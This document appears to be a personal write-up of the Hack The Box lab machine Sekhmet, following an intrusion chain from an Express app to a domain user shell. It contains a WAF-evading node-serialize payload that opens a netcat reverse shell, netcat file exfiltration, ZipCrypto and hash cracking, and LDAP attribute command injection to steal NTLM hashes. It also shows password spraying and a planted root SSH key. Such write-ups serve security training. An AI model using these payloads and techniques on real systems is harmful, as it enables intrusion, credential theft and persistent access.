# Shell as Ray
### Web Enum
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://$IP -H 'Host: FUZZ.windcorp.htb' -fs 153

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.41.62
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.windcorp.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 153
________________________________________________

portal                  [Status: 403, Size: 2436, Words: 234, Lines: 44, Duration: 178ms]

curl --head portal.windcorp.htb
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Thu, 09 Nov 2023 00:01:15 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1066
Connection: keep-alive
X-Powered-By: Express
ETag: W/"42a-ceoj/qzu7pE8a4/5MOc2Roj9g0U"
Set-Cookie: app=s%3AA9sJmAxfzpjUz0JpLmuHlXaUqLJ6pXus.2HFgh5mV2sxlhHL1M4fmPIXtkdXcM4wCmOxDBdHo5KE; Path=/; HttpOnly
```

Another cookie `eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOiIxIiwibG9nb24iOjE2OTk0ODc3ODc2OTV9` combine along with Express (node.js), So try deserialize attack first as natural.

* https://book.hacktricks.xyz/pentesting-web/deserialization#node-serialize
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Node.md

Initial attempt got blocked. "You’ve been blocked for security reasons"

Use `man ascii` to bypass the badwords filter of it. `\x00` or Unicode `\u00xx` both works fine.

* https://github.com/coreruleset/coreruleset/blob/v4.0/dev/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf
* https://www.youtube.com/watch?v=vsgPsMZx59w

```json
{"rce":"_$$ND_FUNC\u0024$_function() \u007brequire('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.2 80 >/tmp/f', function(error,stdout,stderr) {console.log(stdout) });\n}()"}
```

### Webster foothold Enum
##### Web folder
```bash
webster@webserver:~$ cat /var/www/nonode/app.js 
//WindCorp Partner Portal
var createError = require("http-errors");
var express = require("express");
//ntlm = require('express-ntlm');
var path = require("path");
var cookieParser = require("cookie-parser");
var session = require("express-session");
var debug = require("debug")("app.js");
var cookie = require('cookie');
var indexRouter = require("./routes/index");
var aboutRouter = require("./routes/about");
var serialize = require('node-serialize');
var app = express();
```
It's not clear whether NTLM authentication is being implemented or removed from the application, but we
take note of this as it might be useful at a later stage

##### ps aux for running process
`sssd` is an open source client for connecting a Linux machine into Active Directory. sssd data are stored in `/var/lib/sss`, but I can’t access anything valuable as webster. `-w, w                unlimited output width`

```bash
webster@webserver:~$ ps auxw | grep sss 
root 333  0.0  2.5  97200 24044 ? Ss   Nov08   0:00 /usr/sbin/sssd -i --logger=files
root 378  0.0  3.0 116796 28220 ? S    Nov08   0:00 /usr/libexec/sssd/sssd_be --domain windcorp.htb --uid 0 --gid 0 --logger=files
root 379  0.0  5.3 111912 50324 ? S    Nov08   0:00 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root 380  0.0  2.4  85160 22692 ? S    Nov08   0:00 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
```

##### Kerbros
```bash
webster@webserver:~$ cat /etc/krb5.conf 
[libdefaults]
        default_realm = WINDCORP.HTB

# The following libdefaults parameters are only for Heimdal Kerberos.
        fcc-mit-ticketflags = true

[realms]
        WINDCORP.HTB = {
                kdc = hope.windcorp.htb
                admin_server = hope.windcorp.com 	<- DC found which is GREAT since nslookup -type=srv 
                					<- _kerberos._tcp.windcorp.htb ;; communications error to 10.129.41.62#53: timed out. Internal Only seem so
                default_domain = windcorp.htb
        }

[domain_realm]
        .windcorp.htb = WINDCORP.HTB
        windcorp.com = WINDCORP.HTB

[appdefaults]
        forwardable = true
                pam = {
                        WINDCORP.HTB = {
                                ignore_k5login = false
                                }
                }
								# The ignore_k5login directive, which would be false by default, was explicitly disabled, 
                                # which suggests that .k5login ACLs may be in use (the system administrator, not knowing 
                                # it was not necessary to set the directive to fals
```
```php looks good
                                ignore_k5login=true|false|service [...]
specifies which other not pam_krb5 should skip checking the user's .k5login
file to verify that the principal name of the client being authenticated is
authorized to access the user account. (Actually, the check is performed by a
function offered by the Kerberos library, which controls which files it will
consult.) The default is false, which causes pam_krb5 to perform the check.
                ```
The DC is named `hope.windcorp.htb`

Also, the `pam_krb5.so` module, responsible for Kerberos authentication, is enabled in the PAM common-auth
settings, which are included by other configuration files such as `/etc/pam.d/sshd` 

* https://www.systutorials.com/docs/linux/man/5-pam_krb5/

```bash
webster@webserver:~$ grep krb5 /etc/pam.d/common-auth
auth    [success=3 default=ignore]      pam_krb5.so minimum_uid=1000
```

##### Network
If it’s not clear from the fact that the shell is in a Linux VM on a Windows target, the IP address of 192.168.0.100 shows that I’m in a VM or container:

```bash
webster@webserver:~$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:10:93:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.0.100/24 brd 192.168.0.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::215:5dff:fe10:9300/64 scope link 
       valid_lft forever preferred_lft forever

webster@webserver:~$ ping -c 2 hope.windcorp.htb
PING hope.windcorp.htb (192.168.0.2) 56(84) bytes of data.
64 bytes from hope.windcorp.htb (192.168.0.2): icmp_seq=1 ttl=128 time=0.388 ms
64 bytes from hope.windcorp.htb (192.168.0.2): icmp_seq=2 ttl=128 time=0.530 ms
       ```

### Decrypt the zip
* https://github.com/A1vinSmith/OSCP-PWK/wiki/Netcat#bonus-nc-file-transfer-can-bypass-password-credentials

```bash
webster@webserver:~$ nc -w 3 10.10.16.2 1234 < backup.zip
webster@webserver:~$ sha256sum backup.zip 
d56801589dc5e2de98cfa3de85f179ff39cd29450f4288709847d35be55678af  backup.zip
```

Both hashcat and john failed on it. * https://github.com/hashcat/hashcat/issues/3267

list files

```bash
7z l backup.zip

Type = zip
Physical Size = 72984

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2022-05-01 04:27:46 .....         1509          554  etc/passwd
2021-02-11 00:49:04 D....            0            0  etc/sssd/conf.d <SNIP>

7z l -slt backup.zip <- slt to get details of files

----------
Path = etc/passwd
Folder = -
Size = 1509
Packed Size = 554
Modified = 2022-05-01 04:27:46
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = D00EEE74
Method = ZipCrypto Deflate <- files are encrypted with ZipCrypto
Host OS = Unix
Version = 20
Volume Index = 0

Path = etc/sssd/conf.d
Folder = +
Size = 0
Packed Size = 0
Modified = 2021-02-11 00:49:04
Created = 
Accessed = 
Attributes = D_ drwxr-xr-x
Encrypted = -
Comment = 
CRC = 
Method = Store
Host OS = Unix
Version = 10
Volume Index = 0

7z l -slt backup.zip | grep Method
```

##### ZipCrypto plaintext attack
Check `.zshrc` to see how those compiled

* https://wiki.anter.dev/misc/plaintext-attack-zipcrypto/
* https://www.acceis.fr/cracking-encrypted-archives-pkzip-zip-zipcrypto-winzip-zip-aes-7-zip-rar/

The exploit needs to know plaintext of one of the files in the archive. 

```bash
7z l -slt backup.zip etc/passwd | grep CRC
CRC = D00EEE74
```
or from the victim
```bash
webster@webserver:/$ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import binascii
>>> with open('/etc/passwd', 'rb') as f:
...     data = f.read()
... 
>>> hex(binascii.crc32(data) & 0xffffffff)
'0xd00eee74'
```

Good, we have the plaintext. So now, need to download it from the victim machine. Just like how backup.zip been downloaded. Zip it, Then use it to get key to decrypt it. Then read those files of course.

```bash
zip plain.zip passwd
  adding: passwd (deflated 64%)

mkdir etc
mv passwd etc

bkcrack -C backup.zip -c etc/passwd -P plain.zip -p passwd       				<- Get the key
bkcrack 1.5.0 - 2023-11-10
[10:32:09] Z reduction using 535 bytes of known plaintext
100.0 % (535 / 535)
[10:32:09] Attack on 14541 Z values at index 9
Keys: d6829d8d 8514ff97 afc3f825
91.2 % (13256 / 14541)
[10:32:25] Keys
d6829d8d 8514ff97 afc3f825

bkcrack -C backup.zip -k d6829d8d 8514ff97 afc3f825 -U backup-passed.zip alvin 	<- Open it with whatev passwd
```

### Get Ray.Duncan Password
`tdbdump done/var/lib/sss/db/cache_windcorp.htb.ldb | grep cachedPassword` is okayish. But scripting is better.

```zsh
/home/alvin/Tools/SSSD-creds/analyze.sh done/var/lib/sss/db/

### 1 hash found in done/var/lib/sss/db//cache_windcorp.htb.ldb ###

Account:        Ray.Duncan@windcorp.htb
Hash:           $6$nHb338EAa7BAeuR0$MFQjz2.B688LXEDsx035.Nj.CIDbe/u98V3mLrMhDHiAsh89BX9ByXoGzcXnPXQQF/hAj5ajIsm0zB.wg2zX81

  =====> Adding done/var/lib/sss/db//cache_windcorp.htb.ldb hashes to hashes.txt <=====

john hashes.txt

pantera          (Ray.Duncan@windcorp.htb)
```

##### Get the ticket and root the Ray.duncan
Run those after config `/etc/krb5.conf` and `/etc/resolve.conf`. Also don't forget to add DC domain to host file `hope.windcorp.htb`. I failed to connect KDC. Then I realized `PING hope.windcorp.htb (192.168.0.2) 56(84) bytes of data.` Okay have to run it through the webster shell.

```bash victim
nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.16.2] from (UNKNOWN) [10.129.41.62] 52532
bash: cannot set terminal process group (473): Inappropriate ioctl for device
bash: no job control in this shell
webster@webserver:/$ kinit ray.duncan
kinit ray.duncan
Password for ray.duncan@WINDCORP.HTB: pantera

webster@webserver:/$ klist
klist
Ticket cache: FILE:/tmp/.cache/krb5cc.32420
Default principal: ray.duncan@WINDCORP.HTB

Valid starting       Expires              Service principal
11/09/2023 23:26:56  11/10/2023 04:26:56  krbtgt/WINDCORP.HTB@WINDCORP.HTB
        renew until 11/10/2023 23:26:44
webster@webserver:/$ ksu
ksu
Authenticated ray.duncan@WINDCORP.HTB
Account root: authorization for ray.duncan@WINDCORP.HTB successful
Changing uid to root (0)
cat /root/user.txt
```

`ksu` is a program that will try to get root privileges using Kerberos / AD as the arbitrator

##### Make solid SSH connection
```bash
ssh-keygen -t ed25519 -C "alvin.sekhmet@htb.com"

echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGkXVEkioIrjCqijFZmfXYbIstPRid8utRuXTCECeWF6 alvin.sekhmet@htb.com" >> /root/.ssh/authorized_keys

chmod 600 ray_keys/key
ssh root@$IP -i ray_keys/key

Last login: Mon Aug 22 12:58:02 2022
root@webserver:~#
```

Delete keys after the box
```bash
tree
.
├── etc
	└── passwd
├── hashes.txt
├── ray_keys
	├── key
	└── key.pub
└── README.md
```

# Shell as Bob.Wood
### Enum
```bash root ssh
root@webserver:~# iptables-save 
# Generated by iptables-save v1.8.7 on Thu Nov  9 23:43:26 2023
*filter
:INPUT ACCEPT [254115:26259892]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [184:10896]
-A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m multiport --dports 53,80,88,443 -m state --state NEW -j ACCEPT
-A OUTPUT -p udp -m multiport --dports 53,88,123 -m state --state NEW -j ACCEPT
-A OUTPUT -p icmp -m comment --comment "Allow Ping to work as expected" -j ACCEPT
-A OUTPUT -d 192.168.0.0/24 -m owner ! --uid-owner 0 -m state --state NEW -j DROP
COMMIT
# Completed on Thu Nov  9 23:43:26 2023
root@webserver:~# dig +noall +answer hope.windcorp.htb
hope.windcorp.htb.      1200    IN      A       192.168.0.2
hope.windcorp.htb.      1200    IN      A       10.129.41.62
```

A Nmap binaries would run the same result or pivot.

### Pivot and Kerbros it
* https://github.com/A1vinSmith/OSCP-PWK/wiki/SSH-&-Chisel-&-Pivoting#pivoting

```bash
ssh root@$IP -i ray_keys/key -D 1080 -f -N

sudo cp /etc/krb5.conf /etc/krb5.conf.Sekhmet
sudo cat /etc/krb5.conf.Sekhmet
[libdefaults]   
        default_realm = WINDCORP.HTB

[realms]
        WINDCORP.HTB = {
                kdc = hope.windcorp.htb
                admin_server = hope.windcorp.com
                default_domain = windcorp.htb
        }
        ```

If DNS is having trouble getting through the proxy, I’ll disable that in `/etc/proxychains.conf` and add `hope.windcorp.htb` to my /etc/hosts file as `192.168.0.2`. Luckily I didn't need to on that step, YET.

```conf
## Proxy DNS requests - no leak for DNS data
# (disable all of the 3 items below to not proxy your DNS requests)

# method 1. this uses the proxychains4 style method to do remote dns:
# a thread is spawned that serves DNS requests and hands down an ip
# assigned from an internal list (via remote_dns_subnet).
# this is the easiest (setup-wise) and fastest method, however on
# systems with buggy libcs and very complex software like webbrowsers
# this might not work and/or cause crashes.
# proxy_dns
```

Albeit, I need to do that (`echo "192.168.0.2 hope.windcorp.htb" | sudo tee -a /etc/hosts`) for the SMB. Also `sudo chmod +r /etc/krb5.conf` to avoid the annonying `sudo` issue.

`nameserver 10.10.16.2` Attacker & Vicim's IP as nameserver to `resolv.conf` also can make the proxychain faster. More importantly, without it the Bob evil-winrm won't work.

* https://www.legendu.net/misc/blog/tips-on-kerberos/

Now no need sudo for klist anymore

```bash
[libdefaults]   
    	default_realm = WINDCORP.HTB

[realms]
        WINDCORP.HTB = {
                kdc = hope.windcorp.htb
        }


proxychains kinit ray.duncan
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  hope.windcorp.htb:88  ...  OK
Password for ray.duncan@WINDCORP.HTB: 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  hope.windcorp.htb:88  ...  OK

klist
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: ray.duncan@WINDCORP.HTB

Valid starting     Expires            Service principal
10/11/23 12:48:26  10/11/23 17:48:26  krbtgt/WINDCORP.HTB@WINDCORP.HTB
        renew until 11/11/23 12:48:22
```

Another thing that other writeups using old version `smbclinet` `-k` already not working. Use `-N` no pass instead.

And it's just buggy not robust due to machine blocking tunnel from no-root users. Need to restart the box if needed.

```bash
proxychains smbclient -L hope.windcorp.htb -N
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  hope.windcorp.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  hope.windcorp.htb:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  hope.windcorp.htb:88  ...  OK

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        WC-Share        Disk      
SMB1 disabled -- no workgroup available

proxychains smbclient //hope.windcorp.htb/WC-Share -N

smb: \temp\> get debug-users.txt
getting file \temp\debug-users.txt of size 88 as debug-users.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

proxychains smbclient //hope.windcorp.htb/NETLOGON -N
smb: \> ls
  .                                   D        0  Mon May  2 19:49:18 2022
  ..                                  D        0  Tue Apr 26 08:59:55 2022
  form.ps1                            A     2124  Mon May  2 18:47:14 2022 <- GPT: it creates a Windows form that allows the user to update their mobile number and saves the changes to the user information.
  Update phone.lnk                    A     2710  Mon May  2 18:37:33 2022
  windcorp-logo.png                   A    47774  Mon May  2 09:45:04 2022

smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \form.ps1 of size 2124 as form.ps1 (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)
getting file \Update phone.lnk of size 2710 as Update phone.lnk (3.0 KiloBytes/sec) (average 2.4 KiloBytes/sec)
getting file \windcorp-logo.png of size 47774 as windcorp-logo.png (43.5 KiloBytes/sec) (average 16.9 KiloBytes/sec)
```

### Mobile Attributes
This is what it is.

I’ll try modifying Ray Duncan’s mobile attribute in LDAP. I have the full key for the user from the LDB above: `CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB`. From the `tdbdump` above

I can make the change with ldapmodify, which is on webserver:

```bash
root@webserver:~# echo -e 'dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB\nchangetype: modify\nreplace: mobile\nmobile: 1234123455'
dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB
changetype: modify
replace: mobile
mobile: 1234123455
root@webserver:~# echo -e 'dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB\nchangetype: modify\nreplace: mobile\nmobile: 1234123455' | ldapmodify -H ldap://hope.windcorp.htb
SASL/GSS-SPNEGO authentication started
SASL username: ray.duncan@WINDCORP.HTB
SASL SSF: 256
SASL data security layer installed.
modifying entry "CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB"
```

This suggests that `mobile` values are periodically retrieved from LDAP and written to the text file for debugging purposes. Assuming this action might be performed by a PowerShell script, we can try injecting commands in the mobile parameter to see if we can obtain code execution. `$(whoami)` instead of `1234123455`.

By experimenting with different payloads, we quickly learn that the maximum payload length is 65 characters. Additionally, egress firewall rules appear to be blocking outside connections, preventing us from getting a reverse shell. Outgoing NTLM traffic seems to be blocked as well, as our attempts of stealing hashes with Responder are unsuccessful. Looking back to our enumeration findings, we remember the NTLM related configuration found in the web application code, which could be an indication of the fact that outgoing NTLM towards the web server is allowed as an exception to the general blocking rule.

### Collect a Net-NTLMv2 hash as webster when pivoting
* https://0xdf.gitlab.io/2023/04/01/htb-sekhmet.html#auth-as-scriptrunner

I’ll need to enable remote tunneling in `/etc/ssh/sshd_config`. Otherwise, I’ll only be able to listen on local host. As root of the victim, I can do this. I’ll find this line, uncomment it, and change the no to yes:

```conf
#GatewayPorts no
#Turned on for HTB
GatewayPorts yes
```

```bash victim
root@webserver:~# echo -e 'dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB\nchangetype: modify\nreplace: mobile\nmobile: $(net use \\\\webserver.windcorp.htb\\as 2>&1)' | ldapmodify -H ldap://hope.windcorp.htb
SASL/GSS-SPNEGO authentication started
SASL username: ray.duncan@WINDCORP.HTB
SASL SSF: 256
SASL data security layer installed.
modifying entry "CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB"

root@webserver:~# vi /etc/ssh/sshd_config
root@webserver:~# service sshd restart
```

```bash kali
ssh root@$IP -i ray_keys/key -D 1080 -R 0.0.0.0:445:127.0.0.1:445

impacket-smbserver as . -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (127.0.0.1,55848)
[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'
[*] AUTHENTICATE_MESSAGE (WINDCORP\scriptrunner,HOPE)
[*] User HOPE\scriptrunner authenticated successfully
[*] scriptrunner::WINDCORP:aaaaaaaaaaaaaaaa:ca121bb727c4e54b385b49a2edc57d9c:0101000000000000003fb5987413da01fa6d9d9b53b9cf28000000000100100049004d004c006c0075006e00490062000300100049004d004c006c0075006e00490062000200100050004c0048006d006c007900630045000400100050004c0048006d006c0079006300450007000800003fb5987413da01060004000200000008003000300000000000000000000000002100008294a57f9d218473a3e28083e2034773e57d3ec12daca02033758cdb6e397b530a001000000000000000000000000000000000000900360063006900660073002f007700650062007300650072007600650072002e00770069006e00640063006f00720070002e006800740062000000000000000000
```

Hashcat is slightly faster than John

```bash
time john --wordlist=/usr/share/wordlists/rockyou.txt scriptrunner_hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@p%i&J#iNNo1T2  (scriptrunner)     
1g 0:00:00:05 DONE (2023-11-10 14:28) 0.1984g/s 2845Kp/s 2845Kc/s 2845KC/s "chinor23"..!@#fuck
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
john --wordlist=/usr/share/wordlists/rockyou.txt scriptrunner_hash  23.33s user 0.18s system 454% cpu 5.171 total

time hashcat scriptrunner_hash /usr/share/wordlists/rockyou.txt
```

### Password Spray
##### windapsearch failed outside
```bash
proxychains /home/alvin/Tools/windapsearch/windapsearch.py -d hope.windcorp.htb --dc-ip 192.168.0.2 -m users --full -u scriptrunner -p '!@p%i&J#iNNo1T2'

[+] Using Domain Controller at: 192.168.0.2
[+] Getting defaultNamingContext from Root DSE
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.2:389  ...  OK
[+]     Found: DC=windcorp,DC=htb
[+] Attempting bind
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.2:389  ...  OK
[!] {'msgtype': 97, 'msgid': 1, 'result': 8, 'desc': 'Strong(er) authentication required', 'ctrls': [], 'info': '00002028: LdapErr: DSID-0C090256, comment: The server requires binds to turn on integrity checking if SSL\\TLS are not already active on the connection, data 0, v4f7c'}
```

We can see the reason as we could run ldapsearch as root inside
```bash victim
SASL/GSS-SPNEGO authentication started
SASL username: ray.duncan@WINDCORP.HTB
SASL SSF: 256
SASL data security layer installed.
```
##### Ldapsearch
```bash victim
ldapsearch -H ldap://hope.windcorp.htb -b "DC=WINDCORP,DC=HTB" '(objectClass=person)' | grep -i samaccountname: | cut -f2 -d" " > domain_user.txt

nc -l -p 1234 > domain_user.txt
nc -w 3 10.10.16.2 1234 < domain_user.txt
```

##### Kerbrute
Due to `LE_PRELOAD` issue (probably from IppSec), I can't do golang binary under proxychains. Have to go with uploading.

```bash
root@webserver:/tmp# ./kerbrute_linux_amd64 passwordspray -d windcorp.htb --dc hope.windcorp.htb domain_user.txt '!@p%i&J#iNNo1T2' 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/10/23 - Ronnie Flathers @ropnop

2023/11/10 03:38:57 >  Using KDC(s):
2023/11/10 03:38:57 >   hope.windcorp.htb:88

2023/11/10 03:38:58 >  [+] VALID LOGIN:  Bob.Wood@windcorp.htb:!@p%i&J#iNNo1T2
2023/11/10 03:39:03 >  [+] VALID LOGIN:  scriptrunner@windcorp.htb:!@p%i&J#iNNo1T2
2023/11/10 03:39:03 >  Done! Tested 543 logins (2 successes) in 6.343 seconds
```

##### Shell
```zsh
unset KRB5CCNAME
kdestroy
proxychains kinit Bob.Wood

❯ proxychains evil-winrm -k -u Bob.Wood -i hope.windcorp.htb -r wincorp.htb <- IppSec syntax doesnt work for me                                  
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
Server not found in Kerberos database                   
Error: Exiting with code 1

proxychains evil-winrm -i hope.windcorp.htb -r windcorp.htb <- Working ONE!
                                        
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\Bob.Wood\Documents> whoami
windcorp\bob.wood

*Evil-WinRM* PS C:\Users\Bob.Wood\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
WINDCORP\Adminusers                         Group            S-1-5-21-1844305427-4058123335-2739572863-6101 Mandatory group, Enabled by default, Enabled group
WINDCORP\IT                                 Group            S-1-5-21-1844305427-4058123335-2739572863-3602 Mandatory group, Enabled by default, Enabled group
WINDCORP\Protected Users                    Group            S-1-5-21-1844305427-4058123335-2739572863-525  Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

# Beyond Root
### Modsecurity config
```bash
webster@webserver:/etc/nginx/modules-enabled$ cat 50-mod-http-auth-pam.conf
load_module modules/ngx_http_auth_pam_module.so;

webster@webserver:/var/log/nginx$ ls

access.log
access.log.1
error.log 		<- It blocks bunch of things
error.log.1
error.log.2.gz
error.log.3.gz
error.log.4.gz
error.log.5.gz

cat error.log.1 | tail -1
```
